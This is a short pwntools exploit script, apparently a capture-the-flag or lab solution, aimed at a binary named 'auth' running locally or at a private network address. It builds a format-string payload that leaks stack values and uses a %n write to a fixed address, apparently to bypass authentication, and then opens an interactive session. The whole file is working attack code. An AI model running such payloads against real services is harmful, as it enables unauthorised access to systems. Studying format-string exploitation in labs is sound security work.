from pwn import *
import re

HOST, PORT = "192.168.125.100", 9101
BINARY = './auth'

def start():
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process(BINARY)
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)

def solve():
    p = start()

    # p = gdb.debug('./auth', '''
    #     b *main+0x8a
    #     b *main+0x8f
    #     break authenticate
    #     continue
    # '''
    # )
    
    payload = b'.%6$p.%7$p.%8$n.'
    payload += p64(0x404089)

    p.sendlineafter(":", payload)

    p.interactive()

solve()
